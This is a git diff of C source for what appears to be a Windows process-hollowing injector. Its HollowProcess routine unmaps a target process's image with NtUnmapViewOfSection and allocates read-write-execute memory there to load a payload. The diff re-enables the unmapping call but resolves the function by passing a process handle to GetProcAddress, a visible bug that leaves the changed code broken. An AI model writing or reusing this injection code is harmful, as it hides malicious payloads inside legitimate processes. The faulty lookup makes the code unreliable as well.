@@ -5,23 +5,7 @@
 #include "native.h"
 #include "debug.h"
 
-NtUnmapViewOfSection_t pNtUnmapViewOfSection = NULL;
 
-BOOL InitNtUnmapView() {
-    HMODULE hNtDLL = GetModuleHandle("ntdll.dll");
-    if (hNtDLL == NULL) {
-        LOG_ERROR("Failed to get a handle to ntdll.dll, error: %ld\n", GetLastError());
-        return FALSE;
-    }
-
-    pNtUnmapViewOfSection = (NtUnmapViewOfSection_t)GetProcAddress(hNtDLL, "NtUnmapViewOfSection");
-    if (pNtUnmapViewOfSection == NULL) {
-        LOG_ERROR("Failed to get address of NtUnmapViewOfSection, error: %ld\n", GetLastError());
-        return FALSE;
-    }
-
-    return TRUE;
-}
 DWORD GetMainThreadId(DWORD dwProcessId) {
     HANDLE hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
     if (hThreadSnap == INVALID_HANDLE_VALUE) {
@@ -89,11 +73,10 @@ BOOL SuspendProcess(DWORD dwPID) {
 }
 
 BOOL HollowProcess(HANDLE hProcess, PBYTE pPayload, SIZE_T sSize) {
-    if (!InitNtUnmapView()) {
-        LOG_ERROR("Failed to initialize NtUnmapView, error: %ld", GetLastError());
-        return FALSE;
-    }
-    LOG_SUCCESS("ALL GOOD");
+
+    LOG_INFO("Populating NT function prototypes");
+    NtUnmapViewOfSection meowUnmap = (NtUnmapViewOfSection)GetProcAddress(hProcess, "NtUnmapViewOfSection");
+    LOG_SUCCESS("Successfully populated NT function prototypes");
 
     PIMAGE_DOS_HEADER pDOSHeader = (PIMAGE_DOS_HEADER)pPayload;
 
@@ -126,13 +109,12 @@ BOOL HollowProcess(HANDLE hProcess, PBYTE pPayload, SIZE_T sSize) {
     LOG_INFO("Attempting to unmap ImageBase: 0x%p from process: 0x%p", (PVOID)pNTHeaders->OptionalHeader.ImageBase, hProcess);
 
     // Unmap the existing executable from the target process
-    /*
-    if (pNtUnmapViewOfSection(hProcess, (PVOID)pNTHeaders->OptionalHeader.ImageBase) != STATUS_SUCCESS) {
+    if (meowUnmap(hProcess, (PVOID)pNTHeaders->OptionalHeader.ImageBase) != STATUS_SUCCESS) {
         LOG_ERROR("It's jover");
         LOG_ERROR("Failed to unmap the section from the target process, error: %ld", GetLastError());
         return FALSE;
     }
-    */
+
     LOG_SUCCESS("ALL GOOD");
     // Allocate memory in the target process for the new executable
     LPVOID pRemoteImage = VirtualAllocEx(hProcess, (LPVOID)pNTHeaders->OptionalHeader.ImageBase, pNTHeaders->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
